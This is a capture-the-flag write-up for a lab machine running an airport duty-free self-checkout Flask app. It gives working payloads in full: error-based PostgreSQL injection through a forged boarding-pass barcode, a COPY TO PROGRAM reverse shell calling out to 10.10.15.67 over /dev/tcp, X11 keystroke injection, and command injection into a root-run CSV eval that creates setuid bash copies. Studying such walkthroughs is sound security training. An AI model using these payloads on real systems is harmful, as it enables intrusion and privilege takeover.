# dutybound

```
Nmap scan report for 10.129.152.200
Host is up, received echo-reply ttl 63 (0.067s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE  REASON         VERSION
22/tcp  open  ssh      syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.18 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp  open  http     syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to https://airsnacks.htb/
443/tcp open  ssl/http syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
| ssl-cert: Subject: commonName=airsnacks.htb
| Not valid before: 2026-08-26T08:17:18
|_Not valid after:  2126-08-02T08:17:18
|_http-title: Welcome \xC2\xB7 AirSnacks Self-Checkout
|_ssl-date: TLS randomness does not represent time
|_http-server-header: nginx/1.18.0 (Ubuntu)
| tls-alpn: 
|_  http/1.1
| tls-nextprotoneg: 
|_  http/1.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## enum

web service is a flask app, determined via the content of the 404 page, and cookie format

we can add shit to a cart, and need to scan a barcode in order to check out.

it says that service isn't functional, and the client just sends an empy json when we try to do it:

```javascript
// ...

const pending = postJSON("/checkout/boarding-pass/verify", { raw: "" });
    await new Promise(function (r) { setTimeout(r, 1400); });
    try { await pending; } catch (e) {}

// ...
```

one thing to note, which is a hint for the next step, is that barcode scans are ingested into some sort of audit log (database)

```html
  <div class="notice">
    <b>Customs &amp; VAT notice.</b> For export verification, your boarding-pass
    details are recorded in our sales audit log in accordance with HMRC
    requirements. <span class="ref">AirSnacks — VRS TravelPOS ref. VRS-3341</span>
  </div>
```

however if we forge our own requests here, we can get it to try parsing a barcode

![img1](/images/duty1.png)

the error code "BCBP_..." indicates this should be of the format IATA Bar coded bording pass, detailed in the IATA common use standard resolution 792.

i just asked a clanker to generate a valid one for me:

```
M1DOE/JANE            EABC123 YULHTBAC 0834 319J001A0025 1FF>6181WW6301BAC 00141234560032A0141234567890 1AC AC 1234567890123    20KYX
```

at offset 66 is the start of the "conditional data", which the server will complain about not having if we don't supply it. the first two characters are the length of it in hex, i put FF here just to have the max space possible (it gets truncated)

at the end of the conditional data is arbitrary data reserved for "airline use" (the 'X' at the end is the first character of this)

## foothold

this is where we start looking for things. taking into account the previous hint, we may try sqli.

placing a `'` will normally trigger an error in the case of sqli, and with that we get a response like:

```json
{"detail":"unterminated quoted string at or near \"''')\"\nLINE 1: ...0834', '319', 'YUL', 'HTB', 'AC', '1234567890123', 133, ''')\n                                                                   ^\n","error":"DCS_ERR_INTERNAL"}
```

confirming sqli.

you may notice from this error message it is likely postgresql, but we can confirm that with version. since it's error-based, we should trigger an error by attempting to cast a string to int:

```json
{"raw":"M1DOE/JANE            EABC123 YULHTBAC 0834 319J001A0025 1FF>6181WW6301BAC 00141234560032A0141234567890 1AC AC 1234567890123    20KYX');SELECT CAST((version()) AS int)-- -"}
```

which yields:

```json
{"detail":"invalid input syntax for type integer: \"PostgreSQL 18.6 (Ubuntu 18.6-1.pgdg22.04+2) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 11.4.0-1ubuntu1~22.04.3) 11.4.0, 64-bit\"\n","error":"DCS_ERR_INTERNAL"}
```

from here you could enumerate the database tables, etc. but i'll just skip to the good part, which is seeing if we can get rce.

since it is psql 18.6, if the user has `pg_execute_server_program`, we will be able to execute system commands. we can check for this privilege by conditionally triggering an error:

```json
{"raw":"M1DOE/JANE            EABC123 YULHTBAC 0834 319J001A0025 1FF>6181WW6301BAC 00141234560032A0141234567890 1AC AC 1234567890123    20KYX');SELECT CASE WHEN (pg_has_role(current_user, 'pg_execute_server_program', 'USAGE')) THEN 1/(SELECT 0) ELSE NULL END-- -"}
```

and the server will give use a divide by zero error, indicating the test passed, and we can perform rce.

```json
{"raw":"M1DOE/JANE            EABC123 YULHTBAC 0834 319J001A0025 1FF>6181WW6301BAC 00141234560032A0141234567890 1AC AC 1234567890123    20KYX');COPY (SELECT '') TO PROGRAM 'bash -c ''bash -i &> /dev/tcp/10.10.15.67/1337 0>&1'''-- -"}
```

and we will land as the `postgres` user.

## privesc

enumeration of the users reveals another user with a shell and a home dir, `dutyfree-kiosk`. so that's probably the user we want to attack.

however we may have to go through `airsnacksdf` first, which is the user running the webapp, whose source code we can now read in `/opt/vrs/airsnacksdf`

there are also some other scripts int `/opt/vrs` which may be of interest

a quick enumeration of the databases reveals a database `htbairways` with some tables that are probably useless

we can't directly get into the `airsnacks` database yet, because the password exposed in `roles.sql` is bad, and the env files have locked perms. but we can change the user's password with our sqli:

```sql
ALTER ROLE airsnacks_app WITH PASSWORD 'password'
```

still, nothing useful in that database either...

the script `/opt/vrs/bin/apply-duty-rates.sh` has some content:

```bash
RATES="/opt/vrs/data/duty-rates.csv"
# ...
while IFS=, read -r tax_class duty_pct vat_pct; do
    # ...
    eval "${tax_class}=${duty_pct}"

done < "$RATES"
# ...
```

and that csv file can be written by the group `pos-ops`, which dutyfree-kiosk is a member of. so once we get to that user, we will be able to inject commands.

the script runs as root when that csv file is modified. that is because there is a systemd service for it `vrs-duty-apply.service` and `vrs-duty-apply.path`

the .path file has these contents:

```
[Unit]
Description=Watch for duty-rate updates (VRS TravelPOS)

[Path]
PathModified=/opt/vrs/data/duty-rates.csv
Unit=vrs-duty-apply.service

[Install]
WantedBy=multi-user.target
```

keeping that in the back pocket for now...

one interesting thing is there is an x server running, and that user is running openbox. in order to check if we can auth without the cookie file,

```bash
xdpyinfo -display :0
```

which verifies we can reach it without the auth cookie. i've never attacked x before, so the following is very new to me. there is almost definitely a better way to do this.

## abusing x server

i would have loved to just forward the x server to my local machine, but i couldn't figure out how to do that since we don't have ssh, and the box cannot ssh out. so the following is probably the hard way

hacktricks mentions a method of performing input injection into an open server with `xdotool`, but the box doesn't have that. however, xdotools manpage clues us in on how it does that, using something called the XTEST extensions.

```
xdotool lets you programmatically (or manually) simulate keyboard input and mouse activ‐ity, move  and resize windows, etc. It does this using X11's XTEST extension and other Xlib functions.
```

so we could write a program using those extensions on our local machine, copy it over and run it on the box. the strategy is to open a terminal and execute our commands by sending keystrokes.

if you've used openbox before, you know the keybinds are defined in `/etc/xdg/openbox/rc.xml`. there we will find the keybind to open xterm:

```xml
  <keybind key="C-A-t"><action name="Execute"><command>xterm</command></action></keybind>
```

then all we need to do is send our command. `idk.c` does just that (really bad code)

and just compile it with `-lXtst -lX11`, pull it from the box and run it with `DISPLAY=:0`. i did not do it all in one go, first i opened the terminal and checked it was open with `xlsclients -display :0`.

if all goes well we'll have a setuid bash in /tmp that runs as `dutyfree-kiosk`

## root

as we saw before, the path to root has to do with the custom csv ingestion script in `/opt/vrs`

the offending line is this:

```bash
    eval "${tax_class}=${duty_pct}"
```

those variables come from the first two fields in the csv, which we already discovered we have write access to. and due to the systemd file-watcher service or whatever it's really called, any edits we make to that csv will automatically trigger this script as root.

so just replace the first field of `/opt/vrs/data/duty-rates.csv` like so:

```csv
cp /usr/bin/bash /tmp/hz; chmod +s /tmp/hz #,69,20
WINE,25,20
BEER,25,20
SOFT_DRINKS,20,20
SNACKS,20,20
CONFECTIONERY,20,20
WATER,0,0
```

and the eval will expand to

```bash
eval "cp /usr/bin/bash /tmp/hz; chmod +s /tmp/hz #=69"
```

![root](/images/duty2.png)


